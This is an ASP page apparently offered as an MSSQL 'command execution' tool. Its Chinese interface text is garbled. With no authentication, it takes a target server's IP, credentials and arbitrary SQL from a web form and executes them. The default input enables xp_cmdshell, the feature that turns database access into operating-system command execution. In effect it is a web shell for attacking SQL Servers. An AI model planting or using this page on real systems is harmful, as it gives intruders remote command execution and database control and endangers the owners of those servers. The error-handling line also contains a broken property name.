<%
Dim Sql_serverip,Sql_linkport,Sql_username,Sql_password,Sql_database,Sql_content

Sql_serverip=Trim(Request("Sql_serverip"))
Sql_linkport=Trim(Request("Sql_linkport"))
Sql_username=Trim(Request("Sql_username"))
Sql_password=Trim(Request("Sql_password"))
Sql_database=Trim(Request("Sql_database"))
Sql_content =Trim(Request("Sql_content"))

If Sql_linkport="" Then Sql_linkport="1433"

If Sql_serverip<>"" and Sql_linkport<>"" and Sql_username<>"" and Sql_password<>"" and Sql_content<>"" Then

	Response.Write "<hr width='100%'><b>ִ�н�����£�</b><hr width='100%'>"
	Dim SQL,conn,linkStr
	SQL=Sql_content
	
	set conn=Server.createobject("adodb.connection")
	If Len(Sql_database)=0 Then
		linkStr="driver={SQL Server};Server=" & Sql_serverip & "," & Sql_linkport & ";uid=" & Sql_username & ";pwd=" & Sql_password
	Else
		linkStr="driver={SQL Server};Server=" & Sql_serverip & "," & Sql_linkport & ";uid=" & Sql_username & ";pwd=" & Sql_password & ";database=" & Sql_database
	End If
	conn.open linkStr
	
	' "Driver={SQL Server};SERVER=IP,�˿ں�;UID=sa;PWD=xxxx;DATABASE=DB"
	
	conn.execute SQL
	
	on error resume next
	
	if err<>0 then
	   response.write "����"&err.Descripting
	else
	   response.write Replace(SQL,vbcrlf,"<br>") & "<br><br>�ɹ���"
	end if
	
	Response.End
	
End If

If Request("do")<>"" Then
	Response.Write "����д���ݿ����Ӳ���"
	Response.End
End If

%>

<html>
<head>
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
<meta http-equiv="expires" content="Wed, 26 Feb 2006 00:00:00 GMT">
<title>MSSQL���ִ�й���</title>
</head>
<body>

<hr width="100%">

<form method="post" action="<%=Request.ServerVariables("SCRIPT_NAME")%>?do=exec" target="ResultFrame">
	<table border="1" width="100%">
		<tr>
		<td colspan="2" align="center">
			<font size="5"><b>MSSQL���ִ�й���asp��</b></font>
		</td>
		</tr>
		<tr>
		<td>
			<table border="1px">
			<tr><td colspan="2" align="center">���ݿ���������</td></tr>
			<tr><td width="80">SERVERIP:</td><td><input type="text"     name="Sql_serverip"  style="width:150px;"></td></tr>
			<tr><td width="80">LINKPORT:</td><td><input type="text"     name="Sql_linkport"  style="width:150px;"></td></tr>
			<tr><td width="80">USERNAME:</td><td><input type="text"     name="Sql_username"  style="width:150px;"></td></tr>
			<tr><td width="80">PASSWORD:</td><td><input type="password" name="Sql_password"  style="width:150px;"></td></tr>
			<tr><td width="80">DATABASE:</td><td><input type="text"     name="Sql_database"  style="width:150px;"></td></tr>
			</table>
		</td>
		<td width="100%">
			<DIV align=center
			style='
			color: #990099;
			background-color: #E6E6FA;
			border: solid 2px black;
			width: 100%;
			height: 180px;
			scrollbar-face-color: #DDA0DD;
			scrollbar-shadow-color: #3D5054;
			scrollbar-highlight-color: #C3D6DA;
			scrollbar-3dlight-color: #3D5054;
			scrollbar-darkshadow-color: #85989C;
			scrollbar-track-color: #D8BFD8;
			scrollbar-arrow-color: #E6E6FA;
			'>
			<textarea name="Sql_content" style='width:100%;height:100%;'>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE</textarea>
			</DIV>
			<input type="submit" value="ִ������">
		</td>
		</tr>
	</table>
</form>

<hr width="100%">
<iframe name="ResultFrame" width="100%" height="200" src="<%=Request.ServerVariables("SCRIPT_NAME")%>?do=exec"></iframe>
</body>
</html>